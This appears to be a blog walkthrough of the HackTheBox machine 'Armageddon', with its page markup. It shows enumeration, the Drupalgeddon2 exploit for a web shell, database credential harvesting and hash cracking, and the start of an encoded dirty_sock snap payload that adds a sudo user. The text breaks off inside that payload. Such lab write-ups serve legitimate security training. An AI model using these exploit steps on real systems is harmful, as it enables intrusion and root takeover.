<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox - Armageddon | Another infosec blog</title><!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/blog/en/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/blog/en/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/blog/en/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/blog/en/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/blog/en/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/blog/en/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/blog/en/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/blog/en/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/blog/en/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/blog/en/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/blog/en/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/blog/en/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/blog/en/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/blog/en/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/en/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/blog/en/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/en/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/en/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/blog/en/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/blog/en/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/blog/en/assets/css/post.css"><link rel="stylesheet" href="/blog/en/assets/css/post.css"><link rel="preload" as="style" href="/blog/en/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/blog/en/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2020 Cotes Chung MIT Licensed --> <script src="/blog/en/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/blog/en/" alt="avatar"> <img src="/blog/en/assets/img/sample/avatar.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/blog/en/">Another infosec blog</a></div><div class="site-subtitle font-italic">Where one's enthusiasm provides comprehension and knowledge for others.</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/blog/en/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/blog/en/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/blog/en/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/blog/en/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/blog/en/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/legiahuyy" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/0x7c00" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['legiahuy420','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="/blog/en/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog/en/"> Posts </a> </span> <span>HackTheBox - Armageddon</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox - Armageddon</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, May 28, 2021, 2:45 AM +0700" > May 28 <i class="unloaded">2021-05-28T02:45:00+07:00</i> </span> by <span class="author"> Huy </span></div></div><div class="post-content"><p>This is another challenge on HackTheBox - Armageddon. Letâ€™s get started.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap">Nmap</h3><p>We start by enumerating open ports and services on the target machine using <code class="language-plaintext highlighter-rouge">nmap</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>â”Œâ”€â”€(rootðŸ’€kali)-[/home/kali/HackTheBox/Armageddon]
â””â”€# cat nmap/armageddon.nmap 
# Nmap 7.91 scan initiated Thu May 27 00:25:58 2021 as: nmap -sS -sC -sV -p- -oA nmap/armageddon -v 10.10.10.233
Nmap scan report for 10.10.10.233
Host is up (0.23s latency).
Not shown: 65219 closed ports, 314 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 27 01:24:56 2021 -- 1 IP address (1 host up) scanned in 3538.09 seconds
</pre></table></code></div></div><p>There are two open ports which are SSH on <code class="language-plaintext highlighter-rouge">22</code> and a Apache web server on <code class="language-plaintext highlighter-rouge">80</code>. The OpenSSH is usually not exploitable so we should focus on the webserver.</p><p>The homepage includes a login form and allows us to create new accounts but it seems to be not working as the new account needs to get approval from the administrator. Also the request new password feature is only available for existing users.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-12.png" alt="" /></p><h3 id="gobuster">GoBuster</h3><p>I decide to use <code class="language-plaintext highlighter-rouge">gobuster</code> to find more accessible objects on the web server. These results are most likely to give us a hint about what we have to do next.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/home/kali/HackTheBox/Armageddon]
â””â”€# gobuster <span class="nb">dir</span> <span class="nt">-q</span> <span class="nt">-u</span> http://10.10.10.233/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-x</span> php,txt,html,bak <span class="nt">-t</span> 50 <span class="nt">-o</span> gobuster.txt
/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7440]
/misc                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 233] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.233/misc/]
/themes               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 235] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.233/themes/]
/modules              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 236] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.233/modules/]
/scripts              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 236] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.233/scripts/]
/sites                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 234] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.233/sites/]  
/includes             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 237] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.233/includes/]
/install.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 3172]                                   
/profiles             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 237] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.233/profiles/]
/update.php           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 4057]                                   
/README.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5382]                                   
/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2189]                                   
/cron.php             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 7388]                                   
/INSTALL.txt          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 17995]                                  
/LICENSE.txt          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 18092]                                  
/CHANGELOG.txt        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 111613]                                 
/xmlrpc.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 42]                                     
/COPYRIGHT.txt        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1481]  
...
</pre></table></code></div></div><h2 id="exploitation">Exploitation</h2><p>After skimming through all the folders and files, I came across some information about <em>Drupal</em>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-13.png" alt="" /></p><p>As in the <code class="language-plaintext highlighter-rouge">README.txt</code> and <a href="https://www.drupal.org/">their website</a>, Drupal is simply an open-source CMS platform. This revealed Drupal as our exploit target but we have to know about the version of Drupal the machine is using.</p><p>And we can get it by reading <code class="language-plaintext highlighter-rouge">Changelog.txt</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-14.png" alt="" /></p><p>So the version is 7.56, while searching on Google about its vulnerability, I found this <a href="https://github.com/dreadlocked/Drupalgeddon2">Github repo</a> would help us.</p><h3 id="reverse-shell-with-drupalgeddon2">Reverse shell with Drupalgeddon2</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-15.png" alt="" /></p><p>Some brief information about CVE-2018-7600/SA-CORE-2018-002 and you can read more about it <a href="https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/">here</a>.</p><blockquote><p>To provide some background, Drupalâ€™s Form API was introduced in Drupal 6 and allowed alteration of the form data during the form rendering process. This revolutionized the way markup processing was done.</p><p>In Drupal 7 the Form API was generalized to what is now known as <em>Renderable Arrays</em>. This extended API is used to represent the structure of most of the UI elements in Drupal, such as pages, blocks, nodes and more.</p></blockquote><p>Basically it tampers malfunctioned data into the form and abuses the rendering markup process to achieve RCE.</p><p>Thatâ€™s all about the theory and definition, you can use the automated script to exploit the target machine.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> <span class="nv">$ </span>ruby drupalgeddon2.rb 10.10.10.233  
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-18.png" alt="" /></p><p>And we have our RCE endpoint in <code class="language-plaintext highlighter-rouge">http://armageddon.htb/shell.php?c=&lt;command&gt;</code>. Since the shell from Drupalgeddon2 is not flexible and so I upload another shell that has a nice UI - <a href="https://github.com/flozz/p0wny-shell">p0wny-shell</a>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-27_14-05.png" alt="" /></p><h3 id="getting-user-level-credentials-via-mysql">Getting user-level credentials via MySQL</h3><p>Looking into <code class="language-plaintext highlighter-rouge">./sites/default/settings.php</code> gives us our first credentials for the MySQL database running on machineâ€™s local host.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-21.png" alt="" /></p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nv">$databases</span> <span class="o">=</span> <span class="k">array</span> <span class="p">(</span>
  <span class="s1">'default'</span> <span class="o">=&gt;</span>
  <span class="k">array</span> <span class="p">(</span>
    <span class="s1">'default'</span> <span class="o">=&gt;</span>
    <span class="k">array</span> <span class="p">(</span>
      <span class="s1">'database'</span> <span class="o">=&gt;</span> <span class="s1">'drupal'</span><span class="p">,</span>
      <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'drupaluser'</span><span class="p">,</span>
      <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'CQHEy@9M*m23gBVj'</span><span class="p">,</span>
      <span class="s1">'host'</span> <span class="o">=&gt;</span> <span class="s1">'localhost'</span><span class="p">,</span>
      <span class="s1">'port'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
      <span class="s1">'driver'</span> <span class="o">=&gt;</span> <span class="s1">'mysql'</span><span class="p">,</span>
      <span class="s1">'prefix'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
    <span class="p">),</span>
  <span class="p">),</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Using above credentials to list all tables in <code class="language-plaintext highlighter-rouge">drupal</code> database, <code class="language-plaintext highlighter-rouge">users</code> is the most notable one here.</p><p>Letâ€™s dump all information in <code class="language-plaintext highlighter-rouge">users</code> table with following command:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>mysql <span class="nt">--user</span><span class="o">=</span>drupaluser <span class="nt">--password</span><span class="o">=</span>CQHEy@9M<span class="k">*</span>m23gBVj <span class="nt">-D</span> drupal <span class="nt">-e</span> <span class="s1">'select name,pass from users;'</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-22.png" alt="" /></p><p>And we have it as <code class="language-plaintext highlighter-rouge">brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt</code>.</p><p>Next we want to use <code class="language-plaintext highlighter-rouge">hashid</code> to identify the hash then pass it to <code class="language-plaintext highlighter-rouge">hashcat</code> to crack it.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/HackTheBox/Armageddon]
â””â”€<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'</span> | <span class="nb">sudo tee </span>brucetherealadmin.hash
<span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt                   
â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/HackTheBox/Armageddon]
â””â”€<span class="nv">$ </span>hashid brucetherealadmin.hash

<span class="nt">--File</span> <span class="s1">'brucetherealadmin.hash'</span><span class="nt">--</span>
Analyzing <span class="s1">'$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'</span>
<span class="o">[</span>+] Drupal <span class="o">&gt;</span> v7.x 
<span class="nt">--End</span> of file <span class="s1">'brucetherealadmin.hash'</span><span class="nt">--</span>                                                                          
â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/HackTheBox/Armageddon]
â””â”€<span class="nv">$ </span><span class="nb">sudo </span>hashcat <span class="nt">-a</span> 3 <span class="nt">-m</span> 7900 brucetherealadmin.hash /usr/share/wordlists/rockyou.txt  
</pre></table></code></div></div><p>Finally, we acquired the password <code class="language-plaintext highlighter-rouge">brucetherealadmin:booboo</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-24.png" alt="" /></p><h2 id="privilege-escalation">Privilege Escalation</h2><p>We are now able to ssh into 10.10.10.233 using above credentials and have user flag. I also tried login as <code class="language-plaintext highlighter-rouge">brucetherealadmin</code> on the webpage but found nothing that worth our attention.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span><span class="nb">ls
</span>user.txt
<span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span><span class="nb">cat </span>user.txt 
9583f911b01bfc2c80d1216707XXXXXX
<span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span>
</pre></table></code></div></div><p>In this escalation step, first we need to know what <code class="language-plaintext highlighter-rouge">brucetherealadmin</code> can do.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-25.png" alt="" /></p><p>We are able to run <code class="language-plaintext highlighter-rouge">/usr/bin/snap install *</code> as superuser. We also have snap version as following:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span>snap version
snap    2.47.1-1.el7
snapd   2.47.1-1.el7
series  16
centos  7
kernel  3.10.0-1160.6.1.el7.x86_64
</pre></table></code></div></div><p>After a quick search about <em>snapcraft</em>, <a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html">this</a> will help us exploit and do a privesc. They also provide a tl;dr for us to understand the vulnerability.</p><blockquote><p>snapd serves up a REST API attached to a local UNIX_AF socket. Access control to restricted API functions is accomplished by querying the UID associated with any connections made to that socket. User-controlled socket peer data can be affected to overwrite a UID variable during string parsing in a for-loop. This allows any user to access any API function</p></blockquote><p>Describe in basic terms, snapd service allows attacker to add a new user with sudo privilege, known as <code class="language-plaintext highlighter-rouge">dirty_sock:dirty_sock</code>, by installing our crafted <code class="language-plaintext highlighter-rouge">.snap</code> package.</p><p>Letâ€™s reproduce the PoC code as below:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"print(('''                                                                    130 â¨¯
aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
